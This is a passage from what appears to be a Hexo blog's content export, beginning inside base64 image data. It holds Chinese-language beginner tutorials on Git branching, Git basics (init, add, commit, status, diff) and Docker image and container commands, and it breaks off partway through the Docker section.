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" alt="图片3"></p>
<h2 id="0x03-删除分支"><a href="#0x03-删除分支" class="headerlink" title="0x03 删除分支"></a>0x03 删除分支</h2><p>完成合并之后我们就可以删除hexo分支了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -d hexo <span class="comment"># -d 表示删除</span></span></span><br><span class="line"></span><br><span class="line">Deleted branch dev (was b17d20e).</span><br></pre></td></tr></table></figure>



<h2 id="0x04-速查"><a href="#0x04-速查" class="headerlink" title="0x04 速查"></a>0x04 速查</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch</span><br><span class="line">git branch &lt;name&gt;</span><br><span class="line">git checkout &lt;name&gt; or git switch &lt;name&gt;</span><br><span class="line">git checkout -b &lt;name&gt; or git switch -c &lt;name&gt; </span><br><span class="line">git merge &lt;name&gt;</span><br><span class="line">git branch -d &lt;name&gt;</span><br></pre></td></tr></table></figure>



<h2 id="0xXX-学习资源"><a href="#0xXX-学习资源" class="headerlink" title="0xXX 学习资源"></a>0xXX 学习资源</h2><p><a href="https://www.liaoxuefeng.com/wiki/896043488029600/900003767775424" target="_blank" rel="noopener">廖雪峰git</a></p>
<p><a href="https://blog.csdn.net/jjlovefj/article/details/86476925" target="_blank" rel="noopener">git log详解</a></p>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习(一)基础</title>
    <url>/2020/03/01/Git%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我之前会用一些git，教给小组里的同学使用的也是简单的turtoise，完全不用自己处理上传逻辑，所以现在开一个系列，系统地学习一下</p>
<a id="more"></a>

<h2 id="0x01-创建版本库"><a href="#0x01-创建版本库" class="headerlink" title="0x01 创建版本库"></a>0x01 创建版本库</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir myapp</span><br><span class="line">cd myapp</span><br><span class="line">git init # 初始化</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意点：</p>
<p>git只能追踪文本文件的改动，比如添加/删除某些内容，不能准确追踪二进制文件的改动，只知道大小的改变</p>
<p>使用Windows的童鞋要特别注意：</p>
<p>千万不要使用Windows自带的<strong>记事本</strong>编辑任何文本文件。原因是Microsoft开发记事本的团队使用了一个非常弱智的行为来保存UTF-8编码的文件，他们自作聪明地在每个文件开头添加了0xefbbbf（十六进制）的字符，你会遇到很多不可思议的问题，比如，网页第一行可能会显示一个“?”，明明正确的程序一编译就报语法错误，等等，都是由记事本的弱智行为带来的。建议你下载<a href="http://notepad-plus-plus.org/" target="_blank" rel="noopener">Notepad++</a>代替记事本，不但功能强大，而且免费！记得把Notepad++的默认编码设置为UTF-8 without BOM即可：</p>
</blockquote>
<p>然后将编写的文件放入文件夹（复制，新建等）</p>
<p>再将文件<strong>添加</strong>到git仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add x.txt</span><br><span class="line">git add y.txt z.cpp # git 能够多次添加，一次也可以添加多个</span><br></pre></td></tr></table></figure>

<p>最后将文件<strong>提交</strong>到git仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit -m 'first commit'</span><br></pre></td></tr></table></figure>



<h2 id="0x02-查看状态"><a href="#0x02-查看状态" class="headerlink" title="0x02 查看状态"></a>0x02 查看状态</h2><p><code>git status</code>显示版本库当前状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">On branch hexo</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add &lt;file&gt;..." to update what will be committed)</span><br><span class="line">  (use "git restore &lt;file&gt;..." to discard changes in working directory)</span><br><span class="line">  (commit or discard the untracked or modified content in submodules)</span><br><span class="line">        modified:   source/about/index.md</span><br><span class="line">        modified:   themes/next (modified content, untracked content)</span><br><span class="line"></span><br><span class="line">Untracked files:</span><br><span class="line">  (use "git add &lt;file&gt;..." to include in what will be committed)</span><br><span class="line">        "source/_posts/CLion\347\216\257\345\242\203\351\205\215\347\275\256.md"</span><br><span class="line">        "source/_posts/Git\345\255\246\344\271\240.md"</span><br><span class="line"></span><br><span class="line">no changes added to commit (use "git add" and/or "git commit -a")</span><br></pre></td></tr></table></figure>



<h2 id="0x03-查看区别"><a href="#0x03-查看区别" class="headerlink" title="0x03 查看区别"></a>0x03 查看区别</h2><p><code>git diff</code>查看文件是否被修改，修改了哪些部分</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git diff index.md</span></span><br><span class="line">diff --git a/source/about/index.md b/source/about/index.md</span><br><span class="line">index f8e2265..c655ce3 100644</span><br><span class="line">--- a/source/about/index.md</span><br><span class="line">+++ b/source/about/index.md</span><br><span class="line">@@ -2,3 +2,10 @@</span><br><span class="line"> title: about</span><br><span class="line"> date: 2020-01-23 17:21:43</span><br><span class="line"> ---</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line">+## About Me</span><br><span class="line">+</span><br><span class="line">+Profile：A Noob Who Love Security And Wanna Be A Security Reasearcher</span><br><span class="line">+</span><br></pre></td></tr></table></figure>



<h2 id="0xXX-学习资源"><a href="#0xXX-学习资源" class="headerlink" title="0xXX 学习资源"></a>0xXX 学习资源</h2><p><a href="https://www.liaoxuefeng.com/wiki/896043488029600/896827951938304" target="_blank" rel="noopener">廖雪峰git</a></p>
<p><a href="https://learngitbranching.js.org/" target="_blank" rel="noopener">learngitbranching</a></p>
<p><a href="https://sspai.com/post/47694" target="_blank" rel="noopener">用玩游戏的方式学git</a></p>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>docker入门解析</title>
    <url>/2020/02/29/docker%E5%85%A5%E9%97%A8%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="docker入门解析"><a href="#docker入门解析" class="headerlink" title="docker入门解析"></a>docker入门解析</h1><p>最近在docker上搭建了部分漏洞实战平台，感觉docker这玩意很好使，所以学习一波</p>
<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps # 查看运行中的容器</span><br><span class="line">docker images # 查看拉取的镜像</span><br><span class="line">docker search nginx # 搜索nginx镜像</span><br><span class="line">docker pull [Docker Registry地址]&lt;仓库名&gt;:&lt;标签&gt; # 拉取镜像</span><br><span class="line">docker start/restart/stop [container ID] # 启动/重启/停止容器（可以直接停止吗）</span><br><span class="line">docker exec -it [container ID] /bin/bash # 进入到容器中操作</span><br><span class="line">docker rm $(docker ps -aq) # 删除所有容器</span><br><span class="line">docker rmi [image ID] # 删除本地下载的镜像</span><br><span class="line">docker rmi $(docker images -q) # 删除所有镜像</span><br><span class="line">docker logs [container ID] # 查看容器日志</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>docker-compose up</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up [options] [--scale SERVICE=NUM...] [SERVICE...]</span><br><span class="line">选项包括：</span><br><span class="line">-d # 在后台运行服务容器</span><br><span class="line">-no-color # 不是由颜色来区分不同的服务的控制输出</span><br><span class="line">-no-deps # 不启动服务所链接的容器</span><br><span class="line">--force-recreate # 强制重新创建容器，不能与-no-recreate同时使用</span><br><span class="line">–no-recreate # 如果容器已经存在，则不重新创建，不能与–force-recreate同时使用</span><br><span class="line">–no-build # 不自动构建缺失的服务镜像</span><br><span class="line">–build # 在启动容器前构建服务镜像</span><br><span class="line">–abort-on-container-exit # 停止所有容器，如果任何一个容器被停止，不能与-d同时使用</span><br><span class="line">-t, –timeout TIMEOUT # 停止容器时候的超时（默认为10秒）</span><br><span class="line">–remove-orphans # 删除服务中没有在compose文件中定义的容器</span><br></pre></td></tr></table></figure>

<h3 id="镜像相关命令"><a href="#镜像相关命令" class="headerlink" title="镜像相关命令"></a>镜像相关命令</h3><h4 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p>REPOSITORY<br>TAG<br>IMAGE ID<br>CREATED<br>SIZE</p>
<p><code>以上均存储在/var/lib/docker下</code></p>
<h4 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search 镜像名</span><br></pre></td></tr></table></figure>

<p>NAME</p>
<p>DESCRIPTION</p>
<p>STARS</p>
<p>OFFICIAL</p>
<p>AUTOMATED：自动构建，表示该镜像由docker hub自动构建流程构建</p>
<h4 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dockr pull 镜像名</span><br></pre></td></tr></table></figure>

<p>例如，下载centos镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull centos:7</span><br></pre></td></tr></table></figure>

<h4 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker rmi 镜像ID</span><br></pre></td></tr></table></figure>

<p>删除所有镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker rmi `docker images -q`</span><br></pre></td></tr></table></figure>



<h3 id="容器相关"><a href="#容器相关" class="headerlink" title="容器相关"></a>容器相关</h3><h4 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<p>查看所有容器 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p>查看最后一次运行的容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps -l</span><br></pre></td></tr></table></figure>

<p>查看停止的容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps -f status=exited</span><br></pre></td></tr></table></figure>

<h4 id="创建与启动容器"><a href="#创建与启动容器" class="headerlink" title="创建与启动容器"></a>创建与启动容器</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run</span><br><span class="line"><span class="meta">#</span><span class="bash"> -i：表示运行容器</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -t：表示启动后进入其命令行。加入这两个参数后，容器创建就能登陆进去。即分配一个伪终端</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> --name：为创建的容器命名</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -v：表示目录映射关系（前者是宿主机目录，后者是映射到宿主机上的目录），可以使用多个-v做多个目录或者文件映射。注意：最好做目录映射，在宿主机上做修改，然后共享到容器上</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -d：创建一个守护式容器在后台运行（这样创建容器后不会自动登陆容器，如果只加-i -t这里两个参数，创建后就会自动进入容器</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -p：端口映射，前者宿主机端口，后者容器内端口，可以用多个-p做多个端口映射</span></span><br></pre></td></tr></table></figure>

<p>（1）交互式方式创建容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it --name=容器名 镜像名：标签 /bin/bash</span><br></pre></td></tr></table></figure>

<p>这时我们用ps命令看可以发现启动的容器，状态为启动</p>
<p>退出当前容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>

<p>（2）守护式方式创建容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -di --name=容器名称 镜像名称：标签</span><br></pre></td></tr></table></figure>

<p>登录守护式容器的方式</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器名称(or容器id) /bin/bash</span><br></pre></td></tr></table></figure>

<h4 id="停止和启动容器"><a href="#停止和启动容器" class="headerlink" title="停止和启动容器"></a>停止和启动容器</h4><p>停止容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker stop 容器名（or容器id）</span><br></pre></td></tr></table></figure>

<p>启动容器</p>
